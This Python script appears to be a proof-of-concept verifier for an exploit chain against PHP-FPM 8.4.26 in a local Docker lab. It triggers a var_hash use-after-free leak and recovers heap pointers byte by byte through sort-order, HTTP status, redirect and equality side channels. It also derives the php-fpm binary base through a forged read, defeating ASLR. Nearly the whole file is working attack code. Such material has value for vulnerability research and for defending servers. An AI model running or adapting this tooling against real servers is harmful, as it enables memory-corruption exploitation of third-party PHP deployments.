#!/usr/bin/env python3
"""Driver/verifier for sideeffect_exfil_apps.py: proves, against an isolated
nginx -> php-fpm 8.4.26 lab of standalone real-app routes, that an injected heap
pointer (from the var_hash UAF) is recoverable through common app
comparison/branch sinks with no serialize echo -- autodetect classifies each
route by behavior, the sort (order.php) and ordered (gate.php status/redirect)
sinks recover the pointer and agree byte-for-byte, the equality check (check.php)
confirms, and the php-fpm binbase is carried over the sort sink via one forged
read; reflect.php is used only as shape-matched ground truth and --calibrate
re-derives the per-shape object offsets. Pure stdlib, `python3 -I` safe.
Lab/analysis use only, on systems you own.

Lab bring-up / teardown:
    docker compose -f docker-compose.fpm-avenues.yml -p p2s-wex --profile wex up -d --build
    docker compose -f docker-compose.fpm-avenues.yml -p p2s-wex --profile wex down
Usage:
    python3 -I poc/primitives/oracles/verify_sideeffect_exfil_apps.py --port 8153
    python3 -I poc/primitives/oracles/verify_sideeffect_exfil_apps.py --port 8153 --calibrate
"""
from __future__ import annotations

import argparse
import os
import struct
import sys

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
import sideeffect_exfil_apps as X


def _p(bytes6):
    return struct.unpack('<Q', bytes6 + b'\x00' * (8 - len(bytes6)))[0]


def _chunk(bytes6):
    return _p(bytes6) & X.CHUNK_MASK


def calibrate(http, log):
    """Re-derive the per-shape element-0 object offsets via the echo mirror (the
    offline readelf/gdb step). Prints OBJ_OFF_ORDERED / OBJ_OFF_SORT for this
    build so they can be pasted into sideeffect_exfil_apps.py when porting."""
    import re
    payload, spray = X.build_leak_payload()
    for _ in range(4):
        http.post('/reflect.php', [(b'sess', payload)])
    tv = X.reflect_field(http, [(b'sess', payload)])
    H = None
    for k in range(8):
        vo = 8 + k * 32
        o = struct.unpack_from('<Q', spray, vo)[0]
        c = struct.unpack_from('<Q', tv, vo)[0]
        if o != c and c > 0x10000:
            H = c
            break
    chunk = H & X.CHUNK_MASK
    log(f"[calibrate] chunk base = 0x{chunk:x}")
    shapes = {
        'OBJ_OFF_ORDERED (gate.php: sess+need)':
            [(b'need', bytes(X.GUESS_PAD))],
        'OBJ_OFF_SORT    (order.php: rows+256 cand[])':
            [(b'cand[]', bytes(1))] * 256,
    }
    for label, extra in shapes.items():
        found = None
        for D in range(0x5b000, 0x5b400, 8):
            A = chunk + D
            g = X.reflect_field(http, [(b'sess', X.build_isstring_payload(A - 0x18))]
                                + extra)
            if not g or len(g) < 8:
                continue
            V = struct.unpack_from('<Q', g, 0)[0]
            if ((V & 0xFFF) == (X.ZVAL_PTR_DTOR_OFF & 0xFFF) and V > 0x100000000
                    and (V - X.ZVAL_PTR_DTOR_OFF) & 0x1FFFFF == 0):
                found = D + 0x08        # obj = (&zval_ptr_dtor addr) + 0x08
                break
        log(f"[calibrate] {label} = 0x{found:x}" if found
            else f"[calibrate] {label} = NOT FOUND in window")
    return 0


def main(argv=None):
    ap = argparse.ArgumentParser(description=__doc__.splitlines()[0])
    ap.add_argument('--host', default='127.0.0.1')
    ap.add_argument('--port', type=int, default=8153)
    ap.add_argument('--calibrate', action='store_true',
                    help='re-derive per-shape object offsets via the echo mirror')
    a = ap.parse_args(argv)

    http = X.Http(a.host, a.port)
    if a.calibrate:
        return calibrate(http, print)

    # [0] reachability + behavioral detection
    sinks = X.autodetect(http, log=print)
    need = {'sort', 'ordered'}
    if not need.issubset(sinks):
        print(f"[0] FAIL: need {need} sinks, detected {set(sinks)} "
              f"(bring the lab up: docker compose -f docker-compose.fpm-avenues.yml "
              f"-p p2s-wex --profile wex up -d --build)", file=sys.stderr)
        return 2
    gate = sinks['ordered']
    order = sinks['sort']
    check = sinks.get('equality')
    print(f"[0] lab reachable; detected sort+ordered"
          f"{'+equality' if check else ''} sinks by behavior")

    payload, spray = X.build_leak_payload()

    passed = True
    print(f"[1] a7 R: leak fired")
    print("    NOTE: a chunk-INTERIOR leak exposes the ASLR secret = the 2MB "
          "chunk BASE;\n          its low in-chunk bits are allocation-context "
          "dependent (the echo and\n          non-echo access paths leak "
          "different live objects of the SAME chunk),\n          so the match "
          "below is on the chunk base. binbase (step 5) is a FIXED\n          "
          "image address and DOES match byte-for-byte.")

    # [2] SORT / ORDER BY recovery; ground truth chunk base via the echo mirror
    X.warmup(order, payload)
    order.set_payload(payload)
    r0 = http.reqs
    rec_sort = X.sort_recover(order, spray, X.VOFF, X.PTR_BYTES)
    nq_sort = http.reqs - r0
    truth_s = X.reflect_field(http, order.truth_fields(payload, X.VOFF + 1))
    truth_sort = truth_s[X.VOFF:X.VOFF + X.PTR_BYTES] if truth_s else None
    ok_sort = (truth_sort is not None and _chunk(rec_sort) == _chunk(truth_sort))
    passed &= ok_sort
    print(f"[2] SORT/ORDER BY : 0x{rec_sort.hex()} (chunk 0x{_chunk(rec_sort):x})  "
          f"chunk-base match={ok_sort}  {nq_sort / X.PTR_BYTES:.1f} req/byte "
          f"({order.bits_per_req:.1f} bits/req)")

    # [3] ORDERED gate: STATUS, then redirect LOCATION
    X.warmup(gate, payload)
    gate.set_payload(payload)
    r0 = http.reqs
    rec_gate = X.bisect_bytes(gate.hit, spray, X.VOFF, X.PTR_BYTES)
    nq_gate = http.reqs - r0
    truth_g = X.reflect_field(http, gate.truth_fields(payload, X.GUESS_PAD))
    truth_gate = truth_g[X.VOFF:X.VOFF + X.PTR_BYTES] if truth_g else None
    ok_gate = (truth_gate is not None and _chunk(rec_gate) == _chunk(truth_gate))
    passed &= ok_gate
    print(f"[3] ORDERED status: 0x{rec_gate.hex()} (chunk 0x{_chunk(rec_gate):x})  "
          f"chunk-base match={ok_gate}  {nq_gate / X.PTR_BYTES:.1f} req/byte "
          f"(1 bit/req)")
    gate.set_payload(payload)
    rec_loc = X.bisect_bytes(gate.hit_via_location, spray, X.VOFF, X.PTR_BYTES)
    ok_loc = (rec_loc == rec_gate)
    passed &= ok_loc
    print(f"[3b] ORDERED Location: 0x{rec_loc.hex()}  match-status-channel={ok_loc} "
          f"(independent same-endpoint observable)")

    # [4] two independent non-echo channels agree EXACTLY (same strcmp access
    # path -> same in-chunk object); equality as a third channel
    ok_agree = (rec_sort == rec_gate)
    passed &= ok_agree
    print(f"[4] sort vs ordered recover the SAME pointer 0x{rec_gate.hex()}: "
          f"{ok_agree}\n    (two independent non-echo channels agree byte-for-byte, "
          f"no echo)")
    if check is not None:
        ok_check = check.detect()      # 204 on a known prefix, 404 otherwise
        passed &= ok_check
        print(f"[4b] equality channel (check.php) confirms a known prefix: "
              f"{'CONFIRMED' if ok_check else 'FAILED'} (third non-echo channel)")

    # [5] BINBASE over the SAME sort sink (one forged read, 6 requests)
    chunk = _p(truth_gate or rec_gate) & X.CHUNK_MASK
    r0 = http.reqs
    binbase, dtor, bb_bytes = X.exfil_binbase(order, chunk, X.OBJ_OFF_SORT,
                                              log=lambda *_: None)
    nq_bb = http.reqs - r0
    obj = chunk + X.OBJ_OFF_SORT
    isp = X.build_isstring_payload(obj - 0x20)
    truth_f = X.reflect_field(http, [(order.field_param, isp)]
                              + [(order.operand_param + b'[]', bytes(1))] * 256)
    truth_dtor = truth_f[:X.PTR_BYTES] if truth_f else None
    ok_bb = (binbase is not None and bb_bytes == truth_dtor)
    passed &= ok_bb
    print(f"[5] BINBASE via sort: &zval_ptr_dtor=0x{dtor:x} -> "
          f"binbase=0x{(binbase or 0):x}  match={ok_bb}  "
          f"{nq_bb} req  [truth dtor 0x{(truth_dtor or b'').hex()}]")

    # [6] bandwidth table
    print("[6] exfil bandwidth by sink class (no echo on any exfil path):")
    print(f"      sort / ORDER BY rank : {order.bits_per_req:4.1f} bits/req "
          f"(256 candidates -> 1 byte/request; highest; carries binbase too)")
    print(f"      ordered status/redir : {gate.bits_per_req:4.1f} bits/req "
          f"(~8 req/byte; chunk pointer only -- forged read too crash-prone here)")
    print(f"      equality === / prefix: {'1.0':>4} bits/req (confirm-only)")

    print(f"[total] {http.reqs} requests")
    print(f"\nRESULT: {'PASS' if passed else 'FAIL'} - the a7 R: leak "
          f"{'IS' if passed else 'is NOT'} exfil-able through common non-echo "
          f"app sinks")
    return 0 if passed else 1


if __name__ == '__main__':
    try:
        sys.exit(main())
    except KeyboardInterrupt:
        sys.exit(130)
